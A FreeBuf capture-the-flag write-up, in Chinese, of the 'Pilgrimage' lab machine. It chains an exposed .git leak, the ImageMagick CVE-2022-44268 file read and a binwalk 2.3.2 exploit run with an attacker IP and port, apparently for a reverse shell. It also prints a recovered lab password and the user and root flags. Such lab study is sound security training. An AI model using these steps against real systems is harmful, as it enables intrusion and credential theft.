---
title: [Meachines] [Easy] Pilgrimage .Git泄露+ImageMagick-LFI+binwalk-v2.3.2权限提升
url: https://www.freebuf.com/articles/web/421541.html
source: FreeBuf网络安全行业门户
date: 2025-02-13
fetch_date: 2025-10-06T20:35:06.661396
---

# [Meachines] [Easy] Pilgrimage .Git泄露+ImageMagick-LFI+binwalk-v2.3.2权限提升

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

[Meachines] [Easy] Pilgrimage .Git泄露+ImageMagick-LFI+binwalk-v2.3.2权限提升

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

[Meachines] [Easy] Pilgrimage .Git泄露+ImageMagick-LFI+binwalk-v2.3.2权限提升

2025-02-12 11:37:17

所属地 福建省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# Information Gathering

| IP Address | Opening Ports |
| --- | --- |
| 10.10.11.219 | **TCP**:22,80 |

`$ ip='10.10.11.219'; itf='tun0'; if nmap -Pn -sn "$ip" | grep -q "Host is up"; then echo -e "\e[32m[+] Target $ip is up, scanning ports...\e[0m"; ports=$(sudo masscan -p1-65535,U:1-65535 "$ip" --rate=1000 -e "$itf" | awk '/open/ {print $4}' | cut -d '/' -f1 | sort -n | tr '\n' ',' | sed 's/,$//'); if [ -n "$ports" ]; then echo -e "\e[34m[+] Open ports found on $ip: $ports\e[0m"; nmap -Pn -sV -sC -p "$ports" "$ip"; else echo -e "\e[31m[!] No open ports found on $ip.\e[0m"; fi; else echo -e "\e[31m[!] Target $ip is unreachable, network is down.\e[0m"; fi`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# .Git leak && ImageMagick 7.1.0 LFI

`# echo '10.10.11.219 pilgrimage.htb'>>/etc/hosts`

`$ feroxbuster -u 'http://pilgrimage.htb'`

![image.png](https://image.3001.net/images/20250211/1739271506_67ab2d52b8f95b157dbaf.png!small)

http://pilgrimage.htb/

![image-1.png](https://image.3001.net/images/20250211/1739271510_67ab2d5607bb1e2849552.png!small)

![image-2.png](https://image.3001.net/images/20250211/1739271512_67ab2d58cdd71d7ffe979.png!small)

`$ githack http://pilgrimage.htb/.git`

`$ ./magick --version`

![image-3.png](https://image.3001.net/images/20250211/1739271517_67ab2d5d74f3068f792a0.png!small)

https://github.com/voidz0r/CVE-2022-44268

![image-4.png](https://image.3001.net/images/20250211/1739271520_67ab2d603851af6fb9011.png!small)

`$ cargo run "/etc/passwd"`
`$ convert image.png -resize 50% output.png`

![image-5.png](https://image.3001.net/images/20250211/1739271523_67ab2d63b5e06e5344727.png!small)

上传图片

![image-7.png](https://image.3001.net/images/20250211/1739271527_67ab2d67cc0c5981f7924.png!small)
`$ identify -verbose 67aadcf584baa.png`

![image-6.png](https://image.3001.net/images/20250211/1739271531_67ab2d6b3cf2e14b5964a.png!small)

`username:emily`

`$ python3 -c 'with open("hex", "rb") as f: open("dmp.db", "wb").write(bytes.fromhex(f.read().decode()))'`

`$ sqlite3 dmp.db`

`sqlite> select * from users`

![image-8.png](https://image.3001.net/images/20250211/1739271536_67ab2d7035c69e8dee2e9.png!small)

`password:abigchonkyboi123`

## User.txt

> 715cf7707976d6d4f99e0b2e5c72f5ba

# Privilege Escalation:binwalk v2.3.2

![image-10.png](https://image.3001.net/images/20250211/1739271552_67ab2d80378670f88cf1e.png!small)

![image-11.png](https://image.3001.net/images/20250211/1739271555_67ab2d836d407f3d79f01.png!small)

`$ /usr/local/bin/binwalk`

![image-12.png](https://image.3001.net/images/20250211/1739271558_67ab2d8677362a3c17358.png!small)

https://www.exploit-db.com/exploits/51249

`$ python3 exp.py 67aadcf584baa.png 10.10.16.28 10033`

![image-13.png](https://image.3001.net/images/20250211/1739271562_67ab2d8a4a41143a21f5c.png!small)

## Root.txt

> d1c4c05c4039ed97c27b001ed3c8b8c8

# web安全 # CTF

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

User.txt

Root.txt

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)